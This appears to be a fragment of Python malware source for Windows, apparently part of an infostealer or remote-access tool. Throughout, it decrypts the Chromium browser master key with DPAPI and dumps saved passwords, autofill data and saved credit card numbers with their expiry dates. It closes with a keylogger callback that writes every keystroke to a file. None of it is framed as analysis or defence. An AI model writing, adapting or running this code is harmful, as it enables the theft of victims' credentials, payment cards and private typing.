# Helper: Get master key for browser data decryption
def get_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Strip DPAPI prefix
        
        # DPAPI Decryption structure
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_void_p)]
            
        blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.c_char_p(encrypted_key), ctypes.c_void_p))
        blob_out = DATA_BLOB()
        
        result = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),
            None,
            None,
            None,
            None,
            0,
            ctypes.byref(blob_out)
        )
        if not result:
            return None
        
        key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return key
    except Exception:
        return None

# Helper: Decrypt browser encrypted value
def decrypt_browser_value(ciphertext, key):
    if not ciphertext:
        return ""
    if not key or AES is None:
        # Fallback to direct DPAPI (older version encryption)
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_void_p)]
            blob_in = DATA_BLOB(len(ciphertext), ctypes.cast(ctypes.c_char_p(ciphertext), ctypes.c_void_p))
            blob_out = DATA_BLOB()
            result = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
            if result:
                value = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode(errors="ignore")
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                return value
        except Exception:
            pass
        return ""
        
    try:
        if ciphertext.startswith(b"v10") or ciphertext.startswith(b"v11"):
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode(errors="ignore")
    except Exception:
        pass
    return ""

# Helper: Dump credentials from a specific browser
def dump_browser_credentials(browser_name, local_state_path, login_data_path):
    if not os.path.exists(login_data_path):
        return f"[-] {browser_name} Login Data not found.\n"
    
    key = get_master_key(local_state_path)
    temp_db = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"{browser_name}_login_temp.db")
    
    try:
        shutil.copy2(login_data_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        
        output = f"=== {browser_name} Credentials ===\n"
        count = 0
        for row in rows:
            url = row[0]
            username = row[1]
            ciphertext = row[2]
            password = decrypt_browser_value(ciphertext, key)
            if username or password:
                output += f"URL: {url}\nUser: {username}\nPass: {password}\n-----------------\n"
                count += 1
                
        cursor.close()
        conn.close()
        os.remove(temp_db)
        return output + f"Total entries decrypted: {count}\n\n"
    except Exception as e:
        if os.path.exists(temp_db):
            os.remove(temp_db)
        return f"[-] Error dumping {browser_name}: {str(e)}\n"

# Helper: Dump autofill and credit card details
def dump_browser_autofill(browser_name, local_state_path, web_data_path):
    if not os.path.exists(web_data_path):
        return f"[-] {browser_name} Web Data not found.\n"
        
    key = get_master_key(local_state_path)
    temp_db = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"{browser_name}_web_temp.db")
    
    output = f"=== {browser_name} Autofill / Cards ===\n"
    
    try:
        shutil.copy2(web_data_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Dump standard Autofill Table
        try:
            cursor.execute("SELECT name, value FROM autofill")
            rows = cursor.fetchall()
            output += "--- General Autofill Info ---\n"
            for row in rows:
                output += f"Name: {row[0]} | Value: {row[1]}\n"
        except Exception:
            output += "[-] General Autofill table empty or failed to read.\n"
            
        # Dump Credit Cards
        try:
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            rows = cursor.fetchall()
            output += "\n--- Saved Credit Cards ---\n"
            for row in rows:
                name = row[0]
                month = row[1]
                year = row[2]
                ciphertext = row[3]
                card_num = decrypt_browser_value(ciphertext, key)
                output += f"Cardholder: {name}\nExpiry: {month}/{year}\nCard Num: {card_num}\n-----------------\n"
        except Exception:
            output += "[-] Credit cards table empty or failed to read.\n"
            
        cursor.close()
        conn.close()
        os.remove(temp_db)
        return output + "\n"
    except Exception as e:
        if os.path.exists(temp_db):
            os.remove(temp_db)
        return f"[-] Error dumping autofill for {browser_name}: {str(e)}\n"

# Keylogger callback
def keylogger_on_press(key):
    global KEYLOGS_FILE
    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        elif key == keyboard.Key.backspace:
            char = " [BACKSPACE] "
        else:
            char = f" [{str(key).replace('Key.', '')}] "
            
    try:
        with open(KEYLOGS_FILE, "a", encoding="utf-8") as f:
            f.write(char)
    except Exception:
        pass

